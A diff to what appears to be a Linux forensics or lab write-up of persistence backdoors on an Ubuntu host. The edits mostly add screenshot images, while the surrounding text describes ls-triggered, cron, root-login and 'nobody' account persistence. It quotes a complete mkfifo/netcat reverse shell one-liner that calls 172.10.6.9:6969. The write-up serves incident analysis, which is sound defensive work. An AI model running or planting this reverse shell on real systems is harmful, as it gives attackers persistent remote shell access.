@@ -20,7 +20,9 @@ Access was provided using privileged credentials:
 
 - **Operating System:** Ubuntu 20.04.6 LTS
 - **User Accounts Investigated:** giorgio, root, nobody
-
+<p align="center">
+  <img src="https://i.imgur.com/Eu6VVQ8.png" width="80%" alt="March Logs"/>
+</p>
 ---
 
 ## Investigation Workflow Overview
@@ -54,12 +56,23 @@ Purpose: Establishes a reverse shell when the ls command is executed
 Backdoor Type: User-level shell persistence
 
 ```
+<p align="center">
+  <img src="https://i.imgur.com/0uLej3R.png" width="80%" alt="March Logs"/>
+</p>
+
+<p align="center">
+  <img src="https://i.imgur.com/ewxbCBP.png" width="80%" alt="March Logs"/>
+</p>
+
+<p align="center">
+  <img src="https://i.imgur.com/7bJXXFA.png" width="80%" alt="March Logs"/>
+</p>
+
 
 ## 2. Scheduled Task Persistence (giorgio)
 A malicious cron-executed reverse shell was identified:
 
 bash
-Copy code
 /usr/bin/rm /tmp/f;
 /usr/bin/mkfifo /tmp/f;
 /usr/bin/cat /tmp/f | /bin/sh -i 2>&1 | /usr/bin/nc 172.10.6.9 6969 > /tmp/f
@@ -68,6 +81,11 @@ Persistence Mechanism: Scheduled task
 C2 Address: 172.10.6.9:6969
 
 Impact: Repeated outbound shell access
+
+<p align="center">
+  <img src="https://i.imgur.com/likslFb.png" width="80%" alt="March Logs"/>
+</p>
+
 
 ## 3. Root Account Investigation
 Upon switching to the root account, an error message appeared automatically, indicating malicious execution without user interaction.
@@ -90,6 +108,15 @@ Mechanism: Automatic execution of reverse shell on login
 
 Privilege Level: Root (critical severity)
 
+<p align="center">
+  <img src="https://i.imgur.com/yHEeQNx.png" width="80%" alt="March Logs"/>
+</p>
+
+<p align="center">
+  <img src="https://i.imgur.com/AZUBHpb.png" width="80%" alt="March Logs"/>
+</p>
+
+
 ## 4. System-Level Persistence
 A final persistence mechanism was identified tied to a default Linux account.
 
@@ -98,6 +125,10 @@ Account Name: nobody
 Description: Abuse of a default system account commonly present in fresh Linux installs
 
 Risk: Difficult-to-detect persistence leveraging trusted system users
+
+<p align="center">
+  <img src="https://i.imgur.com/FFeAT2g.png" width="80%" alt="March Logs"/>
+</p>
 
 ## Indicators of Compromise (IOCs)
 html
